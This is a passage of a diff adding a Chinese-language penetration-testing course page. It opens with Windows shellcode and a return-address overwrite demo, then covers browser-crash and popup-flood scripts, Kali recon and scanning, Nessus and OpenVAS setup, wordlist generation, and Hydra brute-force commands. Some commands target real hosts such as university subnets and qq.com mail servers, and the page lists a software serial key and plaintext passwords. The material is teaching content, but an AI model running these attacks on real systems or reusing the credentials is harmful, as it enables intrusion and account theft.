+    "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
+    "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
+    "\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE"
+    "\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53"
+    "\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24"
+    "\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51"
+    "\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE"
+    "\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45"
+    "\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54"
+    "\x24\x20\x57\xFF\xD0"
+    };
+    ((void(*)(void)) &shellcode)();
+    }
+    void foo(){
+    int *ret;
+    ret = (int*)&ret + 2;// 让ret指向存放返回地址的哪个空间的地址，即EIP的地址
+    *ret = (int)malice; // 设置返回地址为执行malice()
+    }
+    void main(){
+    foo();
+    printf("回不来了！");
+    }
+</code></pre>
+                </div>
+            </div>
+            <div class="tab-pane fade in active" id="1-buffer-1-2">
+                <div class="highlight">
+<pre><code class="html hljs">
+    &lt;html&gt;
+    &lt;body>
+    让IE5崩溃的JavaScript, 消耗系统资源
+    &lt;script>
+    var color = new Array;
+    color[1] = "black";
+    color[2] = "red";
+    for(x = 2; x < 3; x++){
+    document.bgColor = color[x];
+    if(x == 2){ x = 0;}
+    }
+    &lt;/script>
+    &lt;/body>
+    &lt;/html>
+</code></pre>
+                </div>
+            </div>
+            <div class="tab-pane fade in active" id="1-buffer-1-3">
+                <div class="highlight">
+<pre><code class="html hljs">
+    &lt;html&gt;
+    &lt;head>
+    &lt;script language ="JavaScript">
+    function openwindow(){
+    for(i = 0; i < 10; i++){
+    window.open("http://www.cqjtu.edu.cn");
+    }
+    }
+    &lt;/script>
+    &lt;/head>
+    &lt;body onload="openwindow()">
+    弹出窗口
+    &lt;/body>
+    &lt;/html>
+
+</code></pre>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<h3 id="1-tools">端口扫描和字典生成工具</h3>
+
+<div class="bs-callout bs-callout-info">
+
+    <p><a href="../data/ns/portscan.exe" class="btn btn-success">
+        <i class="glyphicon glyphicon-save"></i> PortScan
+    </a> 是一个在Windows下使用的端口扫描工具（有点年头了）。
+        <a href="../data/ns/zkdic.zip" class="btn btn-success">
+            <i class="glyphicon glyphicon-save"></i> 真空字典生成器
+        </a> 也可以生成众多常见的口令了，如果不满足就google吧。
+        <br>有好心的童鞋也为你准备了一些，比如
+        <a href="../data/ns/wpa字典解压后有955兆.rar" class="btn btn-success">
+            <i class="glyphicon glyphicon-save"></i> 这个
+        </a>。（注意：解压后有955兆）
+    </p>
+
+</div>
+</div>
+
+<!-- Kali平台
+================================================== -->
+<div class="bs-docs-section">
+<div class="page-header">
+    <h1 id="2">Kali平台 
+        <small>The quieter you become, the more you are able to hear.</small>
+    </h1>
+    
+</div>
+<p class="lead">以下实验在虚拟机Kali平台下进行，请注意各实验说明。</p>
+<p class="lead">请参考以下三本中级Kali渗透测试教程。</p>
+<a href="../data/ns/Kali Linux 2 Assuring Security by Penetration Testing, 3rd Edition.pdf" target="_blank"><img src="../assets/img/kali2.png" width="500px"></a>
+<a href="../data/ns/Intermediate Security Testing with Kali Linux 2.pdf" target="_blank"><img src="../assets/img/kali.png" width="500px"></a>
+<a href="../data/ns/daxueba-kali-linux-tutorial.pdf" target="_blank"><img src="../assets/img/dxb.png" width="500px"></a>  
+
+<h3 id="2-vbox">虚拟机下载、安装及配置</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>请在你的笔记本中安装虚拟机软件
+        <a href="http://10.1.74.132/%E8%BD%AF%E4%BB%B6/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/Virtual%20Box/VirtualBox-5.1.22-115126-Win.exe" class="btn btn-primary">
+            <i class="glyphicon glyphicon-save"></i> VirtualBox
+        </a> 或
+        <a href="../data/ns/VMware-12.exe" class="btn btn-primary">
+            <i class="glyphicon glyphicon-save"></i> VMware-workstation-12
+        </a> （VM安装序列号：5A02H-AU243-TZJ49-GTC7K-3C61N）
+        。再下载功能强大的渗透环境
+        <a href="http://10.1.74.132/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux/Kali/kali-linux-2017.1-amd64.iso" target="_blank" 
+           class="btn btn-primary">
+            <i class="glyphicon glyphicon-save"></i> kali-linux-2017.1
+        </a> 在虚拟机中进行安装。（文件较大，服务器不一定能承受！！不会安装和配置的同学，请自行google！）
+    </p>
+    <p>也可将Kali独立安装在硬盘或USB上，请自行Goolge</p>
+
+    <p>
+        基本配置说明：
+        <ol>
+            <li>启动Kali，以root:kali(或toor)登录</li>
+            <li>网络的启动（虚拟机桥接或NAT皆可）图形方式/命令方式（编辑/etc/network/interfaces文件）</li>
+          
+            <li>(可选)替换更新源：编辑/etc/apt/sources.list文件，注释原有的源，加入阿里云/中科大（mirrors.ustc.edu.cn）等的源如下：
+                <div>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib<br>
+                </div>
+            </li>
+            <li>(可选，费时)软件更新：运行菜单中“系统工具”-“软件更新”对当前的软件进行更新，或执行命令apt update & apt upgrade -y</li>
+            <li>(可选)安装增强功能可共享剪贴板、调整分配率等(apt install virtualbox-guest-x11 & reboot)</li>
+            <li>(可选)谷歌中文输入法：运行菜单中“系统工具”-“添加/删除软件”，搜索ibus，找到googlepingyin for ibus安装即可</li>
+            <li>(可选)chrome浏览器：同上，在“浏览器”栏目中找到chromium安装即可</li>
+            <li>(可选)让Kali共享Windows文件：选中虚拟机，点击“设置”，选择“共享文件夹”，分配数据空间，名称假设为share，选中“自动挂载”。重启虚拟机后在 media目录下可见</li>
+            <li>(可选)Apache服务器：Kali内置了Apache服务器（目录在/var/www/html/），使用service apache2 start/stop/restart启动/停止/重启，update-rc.d apache2 enable设置为开机启动。</li>
+            <li>(可选)OpenSSH服务器：Kali内置了OpenSSH服务器，service ssh start/stop/restart启动/停止/重启, update-rc.d ssh enable设置为开机启动。编辑/etc/ssh/sshd_config文件，设置PasswordAuthentication和PermitRootLogin为yes允许root登录。</li>
+            <li>(可选)Nessus漏洞分析工具：参见后面Nessus小节</li>
+        </ol>
+        至此，基本配置完成。
+    </p>
+    <p>自行安装渗透对象（Linux） <a href="../data/ns/vdi/metasploitable-linux-2.0.0.zip" class="btn btn-primary">
+        <i class="glyphicon glyphicon-save"></i> metasploitable-linux-2
+    </a> ，渗透对象（XP） <a href="../data/ns/vdi/xpsp2.rar" class="btn btn-primary">
+        <i class="glyphicon glyphicon-save"></i> WindowsXP-sp2
+    </a>，或者
+    <h3 id="2-nginx">使用已经配置好的环境进行练习</h3>
+
+<div class="bs-callout bs-callout-info">
+<p>请下载SSH软件 <a href="/course/Moba.msi" class="btn btn-success"> MobaXterm </a>，访问如下站点：</p>
+<li>10.1.74.128---Kali，用户名和密码是root:kali</li>
+<li>10.1.74.129---Kali，用户名和密码是root:kali</li>
+<li>10.1.74.130---Kali，用户名和密码是root:kali</li>
+<li>10.1.74.113---Metasploitable2 Win7，渗透对象，admin/administrator:123</li>
+<li>10.1.74.114---Metasploitable2 Linux，渗透对象，msfadmin:msfadmin</li>
+</p>
+</div>
+<div class="bs-callout bs-callout-danger">请注意对现实目标进行渗透的危险性！</div>
+<h3 id="2-nginx">配置安全的Nginx服务器</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>Kali中已经内置了Web服务器Apache, 对Apache进行ssl配置请Google</p>
+    <p>Nginx是一个优秀的Web服务器，请使用apt install nginx进行安装（.128 ~ .130机器已经安装了），其主目录仍在/var/www/html/。请先停止apache，再输入nginx即可启动Nginx服务器，在浏览器中输入localhost进行访问
+        （如果显示不能连接，则是nginx未启动，在shell中直接执行nginx即可）。
+        <br>下面我们使用OpenSSL为该服务器颁发证书，将其配置为安全的Web服务器即HTTPS：
+    </p>
+
+    <p>
+    <ol>
+        <li>Nginx的安装目录在/etc/nginx，按以下步骤生成证书</li>
+        <div class="highlight">
+<pre><code class="hljs">
+    cd /etc/nginx 
+    mkdir cert #专门生成cert目录进行ssl配置实验
+    cd cert
+    openssl genrsa -des3 -out server.key 1024 #生成1024位的私钥，会让你输入一个口令进行DES3加密保护
+    openssl req -new -key server.key -out server.csr #生成CSR(Cerificate Signing Request)即证书请求文件（含公钥）
+    cp server.key server.key.org
+    openssl rsa -in server.key.org -out server.key #Nginx使用上述私钥时除去必须的口令
+    openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt #CA签发以CSR文件生成有效期为365天且用私钥签名的证书
+</code></pre>
+        </div>
+        <li>编辑Nginx配置文件/etc/nginx/sites-available/default，将 HTTPS server 小节的内容改为如下（实际上#是注释）</li>
+        <div class="highlight">
+<pre><code class="hljs">
+    server {
+        listen 443; #侦听端口
+        server_name localhost; #网站域名
+        ssl on;
+        ssl_certificate /etc/nginx/cert/server.crt; #证书路径
+        ssl_certificate_key /etc/nginx/cert/server.key; #私钥路径
+        location / {
+            root /etc/nginx/cert/html; #网站根目录
+            index index.html index.htm; #缺省html文件
+        }
+    }
+</code></pre>
+        </div>
+        <li>拷贝自己的 <a href="../data/ns/Kali-Nginx-SSL.rar" class="btn btn-primary">
+            <i class="glyphicon glyphicon-save"></i> 网页文件（4个）
+        </a> 到根目录中
+        </li>
+        <div class="highlight">
+<pre><code class="hljs">
+    cd /etc/nginx/cert
+    mkdir html
+    cp 自己的首页文件 html #将前面下载的网站文件解压
+</code></pre>
+        </div>
+        <li>重启Nginx（如不能启动，可只输入nginx）</li>
+        <div class="highlight">
+<pre><code class="hljs">
+    nginx -t
+    nginx -s reload
+</code></pre>
+        </div>
+
+    </ol>
+    </p>
+    <p>
+        打开浏览器，输入https://localhost进行访问，此时会有安全问题，因为我们的这个服务器证书是自己颁发的，浏览器不能验证，玩玩而已（但我们也可以到相关证书中心进行申请）。
+    </p>
+    <p>友情提供：<a href="../data/ns/OpenSSL-64.exe" class="btn btn-success"><i class=" glyphicon glyphicon-save"></i> Windows平台的OpenSSL</a></p>
+</div>
+
+<h3>信息收集-侦察什么
+    <div class="bs-callout ba-callout-info">
+        <p>侦察是容易被忽视但其实非常重要的工作。“知己知彼，百战不殆”。对你的目标了解越多，则也可能成功。
+        <p>可以从对象的网站、<a class="btn btn-danger" href="http://archive.org" target="_blank"><i class="glyphicon glyphicon-globe"></i> 历史归档网站</a>、社交媒体、信任伙伴、招聘信息等着手。
+    </div>
+</h3>
+<h3 id="2-info-google">信息收集-搜索引擎</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>
+        使用不同引擎（百谷搜雅必360等）练习site、intitle、inurl、filetype、cache等搜索指令，使得搜索效率及结果更好。
+    </p>
+
+    <p>
+        查看不断更新的 <a class="btn btn-danger" href="http://www.exploit-db.com/google-dorks/" target="_blank"><i
+            class="glyphicon glyphicon-globe"></i> Google Hack DataBase </a>
+    </p>
+    <p><a class="btn btn-danger" href="https://www.shodan.io" target="_blank"><i class="glyphicon glyphicon-globe"></i> Shodan</a>是一个可以搜索Internet上的各种设备如计算机、路由器、服务器、摄像头等等的强力引擎, 请探索。</p>
+    <p>
+        <button class="btn btn-success btn-lg btn-block" data-toggle="collapse" data-target="#2-shodan" title="点击查看/隐藏视频">
+            <i class="glyphicon glyphicon-eye-open"></i> 观看shodan视频 </button>
+    </p>
+    <!--视频 -->
+    <div id="2-shodan" class="collapse">
+        <video controls autobuffer="true" width="810px">
+    <source src="../data/ns/video/Search and Access Webcams And Routers Interface using Shodan io.mp4">
+        不支持的浏览器
+    </video>
+    </div>
+    <p>以下pdf为某人的搜索结果</p>
+    <a href="../data/ns/The Shodan Computer Search Engine.pdf" target="_blank"><img src="../assets/img/shodan.png" width="500px"></a>
+</div>
+<h3 id="2-info-domain">信息收集-域名</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>
+        使用以下命令收集有关域或路径的信息。
+
+    <div class="highlight">
+<pre><code class="hljs">
+    1. whois baidu.com  //查询该域的注册信息
+    2. host/dig/dnsenum/atk6-dnsdict6/nslookup www.baidu.com  //查询其IP等信息
+    3. theharvester -d cqjtu.edu.cn -l 100 -b baidu  //基于百度得到跟该域相关的email，主机等最多100条信息。也可使用bing，Google是不行了:(    
+    4. tcptraceroute www.baidu.com（到目标站点路径追踪，没用可能被过滤的icmp）
+</code></pre>
+    </div>
+    </p>
+    <p>
+        或者访问网站 <a class="btn btn-danger" href="http://www.whois.net/" target="_blank"><i
+            class="glyphicon glyphicon-globe"></i> WhoIs </a>
+        以及
+        <a class="btn btn-danger" href="http://news.netcraft.com/" target="_blank"><i
+                class="glyphicon glyphicon-globe"></i> netcraft </a> 来收集信息。
+    </p>
+</div>
+
+<h3 id="2-info-all">信息收集-全面</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>
+        以下工具将收集该对象的较全面的信息。
+    </p>
+    <ol>
+        <li>
+            <p>DMitry (Deepmagic Information Gathering Tool)：一个all-in-one信息搜集工具，运行dmitry www.baidu.com</p>
+        </li>
+    <li><p>
+        whatweb工具：快速得到Web站点的相关信息（运行whatweb www.cqjtu.edu.cn）
+    </p>
+    </li>
+    <!--<li>
+    <p>
+        webshag-gui工具：其spider将进行进行网站爬行得到目录结构和数据（<code> Web程序-Web漏洞扫描-webshag-gui </code>菜单中webshag-gui）。
+    </p>
+    </li>-->
+    <li>
+        <p>Httrack: 强大的克隆网站工具，可离线对网站进行分析。运行httrack angular.cn即可。</p>
+    </li>
+    <li>
+    <p>
+        maltego工具：是社会工程学必备的一个强大的信息收集工具，可得到非常详细的网站、域、个人等方面的信息（<code> 信息搜集 </code>菜单中maltegoce（需免费注册才能使用, user：wang@cqjtu.edu.cn, password：kali2017）
+    </p>
+    </li>
+    
+    </ol>
+    <p>
+        <button class="btn btn-success btn-lg btn-block" data-toggle="collapse" data-target="#2-maltego" title="点击查看/隐藏视频">
+            <i class="glyphicon glyphicon-eye-open"></i> 观看maltego视频 </button>
+    </p>
+    <!--视频 -->
+    <div id="2-maltego" class="collapse">
+        <video controls autobuffer="true" width="810px">
+    <source src="../data/ns/video/10-Maltego%20.mp4">
+        不支持的浏览器
+    </video>
+    </div>
+    <p>
+        <a href="../data/ns/video/10-Maltego%20.mp4" class="btn btn-lg btn-primary btn-block" target="_blank">
+            <i class="glyphicon glyphicon-save"></i> maltego视频-1
+        </a>
+        <a href="../data/ns/video/10-Maltego-2.mp4" class="btn btn-lg btn-primary btn-block" target="_blank">
+            <i class="glyphicon glyphicon-save"></i> maltego视频-2
+        </a>
+    </p>
+</div>
+
+<h3 id="2-scan-host">扫描-活动主机</h3>
+
+<div class="bs-callout bs-callout-info">
+    <ol>
+    <li>
+    <p>
+      arping: 在同一网段中使用arp进行探测, 避免ICMP过滤。arping X.X.X.X -c1 (c1表示探测一次)  
+    </p>
+    </li>
+    <li><p>
+        fping：扫描指定范围内的活动主机（运行fping -s -r 1 -g 202.202.240.0/24）（s显示统计，r为retry，g为范围）
+    </p></li>
+    
+    <li>
+    <p>
+        nping：自由构建各种协议的包（TCP，UDP，ICMP， ARP等），如对防火墙过滤ICMP或主机不对ICMP响应的情况，直接定制TCP包进行探测, 如：<br>
+        nping -c1 --tcp -p 80 --flags syn 202.202.240.6 或 
+        <br>
+        nping -c1 --tcp -p 80 --flags ack 202.202.240.6
+    </p>
+    </li>
+    <li>
+    <p>
+        netenum：速度超快的活动主机扫描器（运行netenum 202.202.240.0/24 10）（10代表超时时间，越长越准确）
+    </p>
+    </li>
+    <li>
+    <p>
+        netdiscover：获取本LAN中活动主机及其MAC等信息（netdiscover -r 10.1.74.0/24，如不指定扫描范围，则为被动模式）
+    </p>
+    </li>
+    <li><p>
+        nbtscan: 使用NetBIOS协议，专门查找Windows系统的主机(有NetBIOS主机名)。（nbtscan 202.202.240.0/24）
+    </p></li>
+</div>
+<a href="../data/ns/Kali Linux Network Scanning Cookbook.pdf" target="_blank"><img src="../assets/img/scan.png" width="500px"></a>
+<h3 id="2-scan-port">扫描-活动端口</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>
+        常规扫描： nmap 10.1.74.113
+    </p>
+    <p> 强力扫描（更多信息）：nmap -A 10.1.74.113</p>
+    <p>
+        TCP连接扫描： nmap -sT -p- -PN 10.1.74.113 (sT意为TCP connect scan，p-表示所有端口)
+    </p>
+
+    <p>
+        SYN扫描： nmap -sS -p 1-1024 -PN 10.1.74.113
+    </p>
+
+    <p>
+        Xmas扫描：nmap -sX -p- -PN 10.1.74.113
+    </p>
+
+    <p>
+        Null扫描：nmap -sN -p- -PN 10.1.74.113
+    </p>
+    
+<a href="../data/ns/Nmap Essentials.pdf" target="_blank"><img src="../assets/img/nmap.png" width="500px"></a> 
+
+    <p>
+        另外，也可使用nmap的图形化扫描工具 - zenmap（直接运行zenmap即可）
+    </p>
+
+    <p>
+        <a href="../data/ns/video/10-Zenmap-1.mp4" class="btn btn-primary btn-block" target="_blank">
+            <i class="glyphicon glyphicon-save"></i> zenmap-1视频
+        </a>
+        <a href="../data/ns/video/10-Zenmap-2.mp4" class="btn btn-primary btn-block" target="_blank">
+            <i class="glyphicon glyphicon-save"></i> zenmap-2视频
+        </a>
+    </p>
+    <!--<p>-->
+    <!--<button class="btn btn-success btn-lg btn-block" data-toggle="collapse" data-target="#2-zenmap1" title="点击查看/隐藏视频"><i class="glyphicon glyphicon-edit"></i> 观看zenmap-1视频 </button>-->
+    <!--</p>-->
+    <!-- 视频 -->
+    <!--<div id="2-zenmap1" class="collapse">-->
+    <!--<video controls autobuffer="true" width="810px">-->
+    <!--<source src="../data/ns/video/10-Zenmap-1.mp4">-->
+    <!--不支持的浏览器-->
+    <!--</video>-->
+    <!--</div>-->
+    <!--<p>-->
+    <!--<button class="btn btn-success btn-lg btn-block" data-toggle="collapse" data-target="#2-zenmap2" title="点击查看/隐藏视频"><i class="glyphicon glyphicon-edit"></i> 观看zenmap-2视频 </button>-->
+    <!--</p>-->
+    <!-- 视频 -->
+    <!--<div id="2-zenmap2" class="collapse">-->
+    <!--<video controls autobuffer="true" width="810px">-->
+    <!--<source src="../data/ns/video/10-Zenmap-2.mp4">-->
+    <!--不支持的浏览器-->
+    <!--</video>-->
+    <!--</div>-->
+
+</div>
+
+<h3 id="2-scan-nessus">扫描-漏洞（Nessus）</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>
+        Nessus可以说是目前全世界最多人使用的系统漏洞扫描与分析软件。其不是开源、免费的软件（也许这才有资金能提供持续的支持），但提供免费使用的个人版，以下为安装及配置步骤：
+    <ol>
+        <li>下载6.10.7版本的64位
+            <a href="../data/ns/Nessus-6.10.7-debian6_amd64.deb" class="btn btn-primary btn-sm">
+                <i class="glyphicon glyphicon-save"></i> Nessus安装包
+            </a>
+        </li>
+        <li>
+            进行 <a class="btn btn-danger btn-sm" href="http://www.nessus.org/register/" target="_blank"><i
+                class="glyphicon glyphicon-globe"></i> 注册 </a>，选择家庭版，注册号将发送到邮箱。
+        </li>
+        <li>使用命令<code> dpkg -i Nessus-6.10.7-debian6_amd64.deb </code>命令进行安装。
+        </li>
+        <!--<li>运行命令 /opt/nessus/bin/nessus-fetch --register （你得到的注册号）进行注册及更新模块
+        </li>
+        <li>运行命令 /opt/nessus/sbin/nessus-adduser 添加用户并设为管理员（需记住，后面登录要使用）
+        </li>-->
+        <li>运行命令<code> /etc/init.d/nessusd start </code>启动nessus服务(stop停止)</li>
+        <li>由于国内网络的原因，Nessus在线更新基本不成功，请下载 <a href="../data/ns/all-2.0.tar.gz" class="btn btn-primary btn-sm">
+                <i class="glyphicon glyphicon-save"></i> 离线插件包</a> , 运行<code>/opt/nessus/sbin/nessuscli update all-2.0.tar.gz</code>进行离线安装。
+        <li>打开浏览器，输入https://安装Nessus计算机的IP:8834 登录Nessus即可（user：kali，passwd：kali）
+        </li>
+    </ol>
+    </p>
+    <p>Nessus扫描出的漏洞我们会在后面的实践中进行利用。</p>
+    <a href="../data/ns/video/10-Nessus%20%20Installing%20on%20Kali%20Linux%20and%20Doing%20a%20Credentialed%20Scan.mp4"
+       class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> Nessus视频-1
+    </a>
+    <a href="../data/ns/video/10-Nessus-2.wmv"
+       class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> Nessus视频-2
+    </a>
+    <br>
+    <a href="../data/ns/Learning Nessus for Penetration Testing.pdf" target="_blank"><img src="../assets/img/nessus.png" width="500px"></a> 
+    <!--<p>-->
+    <!--<button class="btn btn-success btn-lg btn-block" data-toggle="collapse" data-target="#2-nessus" title="点击查看/隐藏视频"><i class="glyphicon glyphicon-edit"></i> 观看nessus视频 </button>-->
+    <!--</p>-->
+    <!--&lt;!&ndash; 视频 &ndash;&gt;-->
+    <!--<div id="2-nessus" class="collapse">-->
+    <!--<video controls autobuffer="true" width="810px">-->
+    <!--<source src="../data/ns/video/10-Nessus%20%20Installing%20on%20Kali%20Linux%20and%20Doing%20a%20Credentialed%20Scan.mp4">-->
+    <!--不支持的浏览器-->
+    <!--</video>-->
+    <!--</div>-->
+</div>
+
+<h3 id="2-scan-openvas">扫描-漏洞（OpenVAS）</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>
+        OpenVAS是开源、开放式漏洞评估系统，也可以说它是一个包含着相关工具的网络扫描器，其与Nessus齐名，由于太大，Kali没有内置，需用apt intall openvas安装。以下为配置步骤：
+    <ol>
+        <li> 选择<code>漏洞分析菜单 - openvas initial setup </code>菜单运行（或命令<code>openvas-setup</code>） ，进行初始配置及更新（有点耗时，期间自动生成用户admin和复杂的密码）
+
+        </li>
+        <li>（可选）执行<code> openvasmd --user=admin --new-password=kali</code> 更改密码为kali
+        <li>（可选）执行<code> openvas-check-setup </code> 检测是否安装成功
+        <li>（可选）默认配置下，仅允许127.0.0.1连接该服务。如果用户想要其它IP登录，需要修改配置文件<code>/lib/systemd/system/greenbone-security-assistant.service</code>中的listen配置项改为0.0.0.0。
+        <li> 选择<code>漏洞分析菜单 - openvas start/stop </code>菜单运行/停止（或命令<code>openvas-start</code>） ，启动OpenVAS。
+        </li>
+        <li>打开浏览器，输入https://安装Openvas计算机的IP:9392，以admin和你上面设置的密码登录
+        </li>
+
+    </ol>
+    </p>
+    <p>指定目标进行扫描即可，其余模块自行研究。OpenVAS扫描出的漏洞我们也会在后面的实践中进行利用。</p>
+    <a href="../data/ns/video/10-OpenVAS%20on%20Kali%20Linux%20Config%20and%20Scanning.mp4"
+       class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> OpenVAS视频
+    </a>
+</div>
+<h3 id="3-force-pass">密码工具-随机字典</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p><code>crunch 1 3 -o pass.list</code>将生成1~3位的字符组合到pass.list文件中。</p>
+    <p><code>crunch 3 3 -f /usr/share/crunch/charset.lst lalpha-numeric -o pass.list</code>将生成3位的小写字母数字组合到pass.list文件中。</p>
+    <p>cewl（Custom Word List）工具可爬取跟某站点相关的一些关键字，命令<code>cewl -w test.list http://202.202.243.2</code>将相关关键字写到pass.list文件中。</p>
+    <p>猜测到某密码可能为cqjtu、12、$组成后，生成一个文件word.list包含这三个词（各占一行），再用命令<code>john --stdout --wordlist=word.list --rules > pass.list</code>
+       进行随机组合（大小写、前后缀、字母替换为数字、反转、重复等）到pass.list文件中。
+</div>
+<h3 id="3-force-hydra">暴力破解-Hydra</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>
+        Hydra/Medusa是支持AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP (NetWare), NNTP, PcAnywhere, POP3, PostgreSQL,
+        rexec, rlogin, rsh, SMB, SMTP (AUTH/VRFY), SNMP, SSHv2, SVN, Telnet, VmAuthd, VNC，RDP等多种协议的密码暴破工具。</p>
+    <p>Medusa与Hydra使用类似，以下我们以Hydra为例。</p>
+    <p>注意：以下user.list文件中有admin、administrator、msfadmin、root四个示例用户，pass.list文件中有123、666666、password、msfadmin四个示例密码</p>
+    <ol>
+        <li>破解445端口的win7/XP网络共享协议SMB
+            <div class="highlight">
+                <pre><code class="hljs">hydra 10.1.74.113 smb -l administrator -P pass.list -V</code></pre>
+            </div>
+        </li>
+        <li>破解3389端口的win7/XP远程桌面协议RDP
+            <div class="highlight">
+                <pre><code class="hljs">hydra 10.1.74.113 rdp -L user.list -P pass.list -V</code></pre>
+            </div>
+        </li>
+        <li>破解22端口的Secure Shell协议SSH
+            <div class="highlight">
+                <pre><code class="hljs">hydra 10.1.74.114 ssh -L user.list -P pass.list -V -t 4</code></pre>
+            </div>
+        </li>
+        <li>
+            某些网站如无线路由器采用HTTP登录质询即在Web页面上弹出登录对话框方式进行验证，则我们可以采用以下命令。
+            <div class="highlight">
+                <pre><code class="hljs">hydra 202.202.243.125 -l admin -P pass.list -t 1 -e ns -f -vV http-get /index.asp</code></pre>
+            </div>
+            <a href="../data/ns/video/10-Hydra%20to%20crack%20challenge.flv" class="btn btn-primary btn-block"
+               target="_blank">
+                <i class="glyphicon glyphicon-save"></i> Hydra-http质询破解视频
+            </a>
+        </li>
+        <br>
+        <li>
+            对没有验证码的Web登录页面，如我们前面安装的渗透对象Metasploitable中的DVWA（其IP为10.1.74.114，浏览器中输入该IP即可访问）。用chrome开发者工具等查看一个错误的用户密码登录后的反馈信息（注意form的格式一定要正确，一般为url:form数据:登录失败字符串）后即可使用如下命令：
+            <div class="highlight">
+                <pre><code class="hljs">hydra -l admin -P pass.list -vV -f 10.1.74.114 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"</code></pre>
+            </div>
+            <a href="../data/ns/video/10-hydra%20to%20crack%20http%20password.mp4" class="btn btn-primary btn-block"
+               target="_blank">
+                <i class="glyphicon glyphicon-save"></i> Hydra-Web登录破解视频
+            </a>
+            <!--<p>-->
+            <!--<button class="btn btn-success btn-lg btn-block" data-toggle="collapse" data-target="#3-force-web" title="点击查看/隐藏视频"><i class="glyphicon glyphicon-edit"></i> 观看Hydra-Web登录破解视频 </button>-->
+            <!--</p>-->
+            <!--&lt;!&ndash; 视频 &ndash;&gt;-->
+            <!--<div id="3-force-web" class="collapse">-->
+            <!--<video controls autobuffer="true" width="810px">-->
+            <!--<source src="../data/ns/video/10-hydra%20to%20crack%20http%20password.mp4">-->
+            <!--不支持的浏览器-->
+            <!--</video>-->
+            <!--</div>-->
+        </li>
+        <br>
+        <li>破解SMTP协议（注意有S参数表示为https方式, 且腾讯企业邮箱对客户端登录错误超过次数限制后将暂时禁用:(）
+            <div class="highlight">
+                <pre><code class="hljs">hydra -S smtp.exmail.qq.com -l wang@cqjtu.edu.cn -P pass.list -vV -e ns smtp</code></pre>
+            </div>
+        </li>
+        <li>破解POP3协议
+            <div class="highlight">
+                <pre><code class="hljs">hydra -S pop.exmail.qq.com -l wang@cqjtu.edu.cn -P pass.list -vV -e ns pop3</code></pre>
+            </div>
+        </li>
+        
+        <li>网站
+            <a href="http://insidetrust.blogspot.com/2011/08/using-hydra-to-dictionary-attack-web.html"
+               class="btn btn-primary" target="_blank">
+                <i class="glyphicon glyphicon-globe"></i> insidetrust.blogspot.com
+            </a> 有较详细的介绍，Youtube上也有大量这方面的视频，请前往参考（使用<code>Kali hydra</code>进行搜索）
+        </li>
+    </ol>
+    </p>
+    <p>另外，在<code> 密码攻击 – 在线攻击 </code>菜单中Hydry-GTK是其图形界面的暴破工具，也可用<code>xhydra</code>在shell启动。
+    </p>
+    <a href="../data/ns/video/10-Hydra-GTK%20to%20hack%20GmailHotmailYahoo%20on%20Kali%20Linux.mp4"
+       class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> 图形界面Hydra破解GMail视频
+    </a>
+</div>
+
+<h3 id="3-force-route">暴力破解-Router</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>
+        如果能破解网络中路由器的登录密码，则可拥有极大的网络控制权。可用的路由器破解命令在<code> 漏洞分析–Cisco工具集 </code>菜单中。当然，我们需要使用<code>traceroute</code>或<code>tcptraceroute</code>列出关键路由器的IP。
+        <br>另外，某些路由器不仅提供23号端口，为方便也提供Web方式管理，也即80端口也是打开的:)
+        以下我们介绍两个，直接在shell窗口中运行。
+    <ol>
+        <li>以字典进行破解
+            <div class="highlight">
+                <pre><code class="hljs">CAT –h 202.202.243.1 -a pass.list </code></pre>
+            </div>
+            <a href="../data/ns/video/10-Cisco-CAT.mp4"
+               class="btn btn-primary btn-block" target="_blank">
+                <i class="glyphicon glyphicon-save"></i> Cisco-CAT视频
+            </a>
+        </li>
+        <br>
+        <li>以Cisco路由器缺省的密码进行破解（扫描其telnet和enable口令）
+            <div class="highlight">
+                <pre><code class="hljs">cisco-ocs 202.202.240.1 202.202.240.254 </code></pre>
+            </div>
+            <a href="../data/ns/video/10-Cisco-ocs.mp4"
+               class="btn btn-primary btn-block" target="_blank">
+                <i class="glyphicon glyphicon-save"></i> Cisco-ocs视频
+            </a>
+        </li>
+    </ol>
+    </p>
+</div>
+<h3 id="3-force-wifi">暴力破解-WiFi</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>
+        当前我们只能通过字典破解对WPA进行暴力破解。虚拟机安装的Kali是不能使用主机的无线网卡的，因此要么使用usb无线网卡然后分配给Kali，要么将Kali直接安装在笔记本中。
+    </p>
+    <p>WPA无线加密的四次握手步骤：
+        
+    </p>
+    <ol>
+            <li>Access Point发送一个一次性使用的随机数（称为ANonce）给client</li>
+            <li>client收到，生成另一个一次性使用的随机数（称为SNonce），将ANonce、SNonce和wifimima进行hash，然后将该hash值与SNonce发回access point</li>
